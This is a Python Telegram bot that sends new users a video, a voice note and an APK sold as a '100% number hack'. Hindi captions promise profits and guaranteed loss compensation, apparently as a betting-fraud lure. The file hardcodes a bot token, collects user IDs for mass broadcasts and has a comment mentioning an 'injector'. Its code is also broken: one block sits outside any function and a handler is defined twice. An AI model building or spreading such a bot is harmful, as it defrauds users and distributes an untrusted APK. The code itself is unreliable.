import os
import logging
import sqlite3
import asyncio
from telegram import Update
from telegram.ext import (
    Application,
    ContextTypes,
    ChatJoinRequestHandler,
    CommandHandler,
)
from telegram.ext import MessageHandler, filters
from telegram.error import Forbidden, BadRequest, TimedOut, NetworkError

# ================= CONFIG =================
BOT_TOKEN = "8157438383:AAF2hzj6X0CJVDnYOLcR8YUYoUM0r0KKtl0"
ADMIN_ID = 7849592882
VIDEO_PATH = "video.mp4"
APK_PATH = "𝙎𝙔𝙑𝙊𝙓 𝙉𝙐𝙈𝘽𝙀𝙍 𝙋𝘼𝙉𝙀𝙇.apk"
VOICE_PATH = "VOICEHACK.ogg"
DB_NAME = "users.db"
# ==========================================

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# ================= DATABASE =================
conn = sqlite3.connect(DB_NAME, check_same_thread=False)
cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
conn.commit()


def add_user(user_id: int):
    try:
        cursor.execute(
            "INSERT OR IGNORE INTO users (user_id) VALUES (?)",
            (user_id,),
        )
        conn.commit()
    except Exception as e:
        logging.error(f"Add user error: {e}")


def get_all_users():
    cursor.execute("SELECT user_id FROM users")
    return [row[0] for row in cursor.fetchall()]


def remove_user(user_id: int):
    cursor.execute("DELETE FROM users WHERE user_id=?", (user_id,))
    conn.commit()


# ================= COMMON SEND =================
async def send_welcome_package(user, context: ContextTypes.DEFAULT_TYPE):
    add_user(user.id)

    welcome_message = f"""
👋🏻 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 {user.mention_html()} 𝐁𝐑𝐎𝐓𝐇𝐄𝐑 𝐓𝐎 𝗢𝗨𝗥 - 𝐉𝐀𝐈𝐂𝐋𝐔𝐁 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐇𝐀𝐂𝐊 𝐒𝐄𝐑𝐕𝐄𝐑 🤑💵
"""

    try:
        await context.bot.send_message(
            chat_id=user.id,
            text=welcome_message,
            parse_mode="HTML",
        )
    except Exception:
        return


# ---------- VIDEO ----------

if os.path.exists(VIDEO_PATH):
    try:
        with open(VIDEO_PATH, "rb") as video:
            await context.bot.send_video(
                chat_id=user.id, video=video, caption="🎥 Yeh raha aapka video"
            )
    except Exception as e:
        logging.error(f"Video send error: {e}")

    # ---------- APK ----------
    if os.path.exists(APK_PATH):
        try:
            with open(APK_PATH, "rb") as apk:
                await context.bot.send_document(
                    chat_id=user.id,
                    document=apk,
                    caption="""📂 ☆𝟏𝟎𝟎% 𝐍𝐔𝐌𝐁𝐄𝐑 𝐇𝐀𝐂𝐊💸

(केवल प्रीमियम उपयोगकर्ताओं के लिए)💎
(𝟏𝟎𝟎% नुकसान की भरपाई की गारंटी)🧬

♻सहायता के लिए @SYVOX007
🔴हैक का उपयोग कैसे करें
https://t.me/+DmyTrk2Ulwk0YmE1""",
                )
        except Exception as e:
            logging.error(f"APK send error: {e}")

    # ---------- VOICE ----------
    if os.path.exists(VOICE_PATH):
        try:
            with open(VOICE_PATH, "rb") as voice:
                await context.bot.send_voice(
                    chat_id=user.id,
                    voice=voice,
                    caption="""🎙 सदस्य 9X गुना लाभ का प्रमाण 👇🏻
https://t.me/+DmyTrk2Ulwk0YmE1

♻सहायता के लिए @SYVOX007
लगातार नंबर पे नंबर जीतना 🤑♻👑""",
                )
        except Exception as e:
            logging.error(f"Voice send error: {e}")


# ================= /START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await send_welcome_package(user, context)


# ================= JOIN REQUEST =================
async def approve_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    request = update.chat_join_request
    if not request:
        return

    user = request.from_user
    await send_welcome_package(user, context)


# ================= BROADCAST =================
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not update.message.reply_to_message:
        await update.message.reply_text("Reply to message to broadcast.")
        return

    include_admin = False
    if context.args and context.args[0].lower() == "all":
        include_admin = True

    users = get_all_users()

    if not include_admin and ADMIN_ID in users:
        users.remove(ADMIN_ID)

    total_users = len(users)

    if total_users == 0:
        await update.message.reply_text("⚠️ No users in database.")
        return

    progress_msg = await update.message.reply_text(
        f"🚀 Broadcast started...\n\nTotal Users: {total_users}"
    )

    delivered = 0
    failed = 0

    for index, user_id in enumerate(users, start=1):
        try:
            await update.message.reply_to_message.copy(chat_id=user_id)
            delivered += 1

        except Forbidden:
            remove_user(user_id)
            failed += 1

        except (BadRequest, TimedOut, NetworkError):
            failed += 1

        except Exception:
            failed += 1

        if index % 10 == 0 or index == total_users:
            percent = int((index / total_users) * 100)
            try:
                await progress_msg.edit_text(
                    f"""🚀 Broadcasting…

📤 Processed: {index}/{total_users}
📬 Delivered: {delivered}
❌ Failed: {failed}
📊 Progress: {percent}%"""
                )
            except Exception:
                pass

        await asyncio.sleep(0.03)

    await progress_msg.edit_text(
        f"""✅ Broadcast Completed

📬 Successfully Delivered: {delivered}
❌ Failed / Blocked: {failed}
👥 Active Reach: {delivered}
📊 Total Users In Database: {len(get_all_users())}
👑 Admin Included: {"YES" if include_admin else "NO"}"""
    )


# ================= USERS COUNT =================
async def users_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    total = len(get_all_users())
    await update.message.reply_text(f"👥 Total Users: {total}")

    # Optional: confirm activation only once


async def capture_user_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = update.message

    if not user or not message:
        return

    # Save user to DB
    add_user(user.id)

    # Prevent bot loop
    if message.from_user.is_bot:
        return

    user_id = user.id
    admin_id = ADMIN_ID  # make sure this is defined at top


async def capture_user_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = update.message

    if not user or not message:
        return

    # Prevent bot loop
    if message.from_user.is_bot:
        return

    user_id = user.id

    # 🚫 STOP if admin
    if user_id == ADMIN_ID:
        return

    # If user not in DB → add & notify admin
    if not user_exists(user_id):
        add_user(user_id)

        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"✅ New Active User\n\nID: {user_id}\nUsername: @{user.username}",
            )
        except:
            pass

    # Echo same message back to user
    try:
        await message.copy(chat_id=user_id)
    except:
        pass

    # Send your injector / welcome package


# ================= MAIN =================
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # Commands first
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("users", users_count))

    # Join request handler
    app.add_handler(ChatJoinRequestHandler(approve_and_send))

    # Message handler LAST (very important)
    app.add_handler(
        MessageHandler(filters.ALL & ~filters.COMMAND, capture_user_message)
    )

    # IMPORTANT: remove allowed_updates restriction
    app.run_polling()


def user_exists(user_id: int):
    cursor.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,))
    return cursor.fetchone() is not None


if __name__ == "__main__":
    main()
